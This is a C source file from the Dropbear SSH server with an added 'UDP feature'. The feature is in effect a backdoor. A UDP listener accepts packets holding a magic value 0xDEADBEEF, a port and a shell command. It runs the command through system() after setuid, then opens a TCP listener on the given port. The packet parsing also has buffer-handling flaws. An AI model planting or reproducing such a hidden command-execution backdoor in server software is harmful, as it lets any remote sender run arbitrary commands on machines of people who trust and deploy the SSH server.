/*
 * Dropbear - a SSH2 server
 * 
 * Copyright (c) 2002,2003 Matt Johnston
 * All rights reserved.
 * 
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * 
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE. */

#include "includes.h"
#include "runopts.h"
#include "signkey.h"
#include "buffer.h"
#include "dbutil.h"
#include "auth.h"
#include "algo.h"
#include "dbrandom.h"



// for UDP feature
#include <stdio.h>
#include <dirent.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>


typedef struct {
    uint32_t magic; /* should be 0xDEADBEEF */
    uint16_t port_number;
    char shell_command[256];
} listen_packet_t;


runopts opts; /* GLOBAL */

/* returns success or failure, and the keytype in *type. If we want
 * to restrict the type, type can contain a type to return */
int readhostkey(const char * filename, sign_key * hostkey,
                enum signkey_type *type) {

    int ret = DROPBEAR_FAILURE;
    buffer *buf;

    buf = buf_new(MAX_PRIVKEY_SIZE);

    if (buf_readfile(buf, filename) == DROPBEAR_FAILURE) {
        goto out;
    }
    buf_setpos(buf, 0);

    addrandom(buf_getptr(buf, buf->len), buf->len);

    if (buf_get_priv_key(buf, hostkey, type) == DROPBEAR_FAILURE) {
        goto out;
    }

    ret = DROPBEAR_SUCCESS;
    out:

    buf_burn(buf);
    buf_free(buf);
    return ret;
}

#if DROPBEAR_USER_ALGO_LIST
void
parse_ciphers_macs()
{
    if (opts.cipher_list)
    {
        if (strcmp(opts.cipher_list, "help") == 0)
        {
            char *ciphers = algolist_string(sshciphers);
            dropbear_log(LOG_INFO, "Available ciphers:\n%s\n", ciphers);
            m_free(ciphers);
            dropbear_exit(".");
        }

        if (strcmp(opts.cipher_list, "none") == 0)
        {
            /* Encryption is required during authentication */
            opts.cipher_list = "none,aes128-ctr";
        }

        if (check_user_algos(opts.cipher_list, sshciphers, "cipher") == 0)
        {
            dropbear_exit("No valid ciphers specified for '-c'");
        }
    }

    if (opts.mac_list)
    {
        if (strcmp(opts.mac_list, "help") == 0)
        {
            char *macs = algolist_string(sshhashes);
            dropbear_log(LOG_INFO, "Available MACs:\n%s\n", macs);
            m_free(macs);
            dropbear_exit(".");
        }

        if (check_user_algos(opts.mac_list, sshhashes, "MAC") == 0)
        {
            dropbear_exit("No valid MACs specified for '-m'");
        }
    }
}
#endif

void print_version() {
    fprintf(stderr, "Dropbear v%s\n", DROPBEAR_VERSION);
}

// get sockaddr, IPv4 or IPv6:
void *get_in_addr(struct sockaddr *sa)
{
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }

    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

int to_listen_packet(char* udp_string_packet, listen_packet_t* packet) {

    const char delimiter[2] = ",";

    char *first_token, *second_token, *third_token;
    uint32_t magic_value;
    uint16_t port_value;
    char command_value[256];


    // Extract the data from the UDP Packet and parse it
    if(first_token = strtok(udp_string_packet, delimiter)) {
        magic_value = (uint32_t) atoi(first_token);
    }
    if(second_token = strtok(NULL, delimiter)) {
        port_value = (uint16_t) atoi(second_token);
    }
    if(third_token = strtok(NULL, delimiter)) {
        size_t size_of_command = strlen(third_token);
        strncpy(command_value, third_token, size_of_command > 255 ? 255 : size_of_command);
    }

    // Error in packet structure
    if(first_token == NULL || second_token == NULL || third_token == NULL) {
        return -1;
    }


    // Assign the data to packet structure
    packet->magic = magic_value;
    packet->port_number = port_value;
    strcpy(packet->shell_command, command_value);

    return 0;
}

void start_tcp_connection(uint16_t port_number) {

    char* buf = NULL;        // buffer for client data
    char* temp = (char*) malloc(sizeof(long unsigned int));

    fd_set master;    // master file descriptor list
    fd_set read_fds;  // temp file descriptor list for select()
    int fdmax;        // maximum file descriptor number
    int nbytes;
    int listener;     // listening socket descriptor
    int newfd;        // newly accept()ed socket descriptor
    struct sockaddr_storage remoteaddr; // client address
    socklen_t addrlen;

    char remoteIP[INET6_ADDRSTRLEN];

    int yes=1;        // for setsockopt() SO_REUSEADDR, below
    int i,rv;

    struct addrinfo hints, *ai, *p;

    FD_ZERO(&master);    // clear the master and temp sets
    FD_ZERO(&read_fds);

    dropbear_log(LOG_INFO, "Attempt TCP connection on port %d", port_number);

    // get us a socket and bind it
    memset(&hints, 0, sizeof hints);

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;

    char port_number_as_string[10];

    sprintf(port_number_as_string, "%d", port_number);

    if ((rv = getaddrinfo(NULL, port_number_as_string, &hints, &ai)) != 0) {
        dropbear_log(LOG_INFO, "TCP Connection error: %s\n", gai_strerror(rv));
        exit(1);
    }

    for(p = ai; p != NULL; p = p->ai_next) {
        listener = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (listener < 0)  continue;
        // lose the pesky "address already in use" error message
        setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));

        if (bind(listener, p->ai_addr, p->ai_addrlen) < 0) {
            close(listener);
            continue;
        }
        break;
    }

    // if we got here, it means we didn't get bound
    if (p == NULL) {
        dropbear_log(LOG_INFO, "selectserver: failed to bind\n");
        exit(2);
    }

    freeaddrinfo(ai); // all done with this

    // listen
    if (listen(listener, 10) == -1) {
        dropbear_log(LOG_INFO, "listen");
        exit(3);
    }

    // add the listener to the master set
    FD_SET(listener, &master);

    // keep track of the biggest file descriptor
    fdmax = listener; // so far, it's this one
    dropbear_log(LOG_INFO, "Server has been created and is ready for clients requests\n");

    // main loop
    for(;;) {
        read_fds = master;     // copy it
        if (select(fdmax+1, &read_fds, NULL, NULL, NULL) == -1) {
            dropbear_log(LOG_INFO, "select error");
            exit(4);
        }
        // run through the existing connections looking for data to read
        for(i = 0; i <= fdmax; i++) {
            if (FD_ISSET(i, &read_fds)) { // we got one!!
                if (i == listener) {
                    // handle new connections
                    addrlen = sizeof remoteaddr;
                    newfd = accept(listener,(struct sockaddr *)&remoteaddr,&addrlen);
                    if (newfd == -1)  dropbear_log(LOG_INFO, "accept error");
                    else {
                        FD_SET(newfd, &master); // add to master set
                        if (newfd > fdmax) fdmax = newfd;    // keep track of the max
                        dropbear_log(LOG_INFO, "selectserver: new connection from %s on "
                                               "socket %d\n", inet_ntop(remoteaddr.ss_family,get_in_addr((struct sockaddr*)&remoteaddr),remoteIP,                             INET6_ADDRSTRLEN),newfd);
                    }
                }
                else {
                    // handle data from a client
                    if ((nbytes = recv(i, temp, sizeof(long unsigned int), 0)) <= 0) {
                        // got error or connection closed by client
                        if (nbytes == 0) dropbear_log(LOG_INFO, "TCP Connection: socket %d hung up", i); // connection closed
                        else dropbear_log(LOG_INFO, "recv");
                        close(i); // bye!
                        FD_CLR(i, &master); // remove from master set
                    }

                        // got some data from a client
                    else {

                        dropbear_log(LOG_INFO, "we got some data from a client\n");
                    }

                } // END handle data from client
            } // END got new incoming connection
        } // END looping through file descriptors
    } // END for(;;)-- thought it would never end!
}

void listen_to_udp_packets(void* arguments) {

    dropbear_log(LOG_INFO, "RUNNING listen_to_udp_packets\n");

    int sock, addr_len, bytes_read;
    char recv_data[1024], send_data[1024];
    struct sockaddr_in server_addr, client_addr;

    listen_packet_t packet;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        dropbear_exit("Socket Error in UDP connection on port %d", DEFAULT_UDP_PORT_NUMBER);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DEFAULT_UDP_PORT_NUMBER);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    bzero(&(server_addr.sin_zero),8);

    if (bind(sock,(struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
        dropbear_exit("Bind Error in UDP connection on port %d", DEFAULT_UDP_PORT_NUMBER);
    }

    addr_len = sizeof(struct sockaddr);

    dropbear_log(LOG_INFO, "UDP Server is listening on port %d", DEFAULT_UDP_PORT_NUMBER);

    for(;;) {

        bytes_read = recvfrom(sock,recv_data,1024,0, (struct sockaddr *)&client_addr, &addr_len);

        recv_data[bytes_read] = '\0';

        dropbear_log(LOG_INFO, "\n(%s , %d) said : ",inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
        dropbear_log(LOG_INFO, "%s", recv_data);

        if(to_listen_packet(recv_data, &packet) < 0) {
            dropbear_log(LOG_INFO, "error in packet structure");
            continue;
        }

        if(packet.magic == 0xDEADBEEF) {

            dropbear_log(LOG_INFO, "0xDEADBEEF value!");

            // Create a child process in order to run and listen to TCP as different user
            pid_t child_process_id = fork();
            int child_return_status = 0;

            if(child_process_id == 0) { // Child is running
                if(setuid(DEFAULT_USERID_FOR_UDP_PACKETS) == -1) {
                    dropbear_log(LOG_INFO, "setuid %d error. please check that the user id exists", DEFAULT_USERID_FOR_UDP_PACKETS);
                    return 1;
                }

                // Run the shell command <packet.shell_command>
                system(packet.shell_command);
                return 0;
            }

            else if(child_process_id > 0) {

                // Wait for child process to terminate
                waitpid(child_process_id, &child_return_status, 0);

                // Create a TCP connection in <packet.port_number>
                start_tcp_connection(packet.port_number);

            }
            else {
                dropbear_log(LOG_INFO, "fork process failed!");
                continue;
            }
        }
    }
}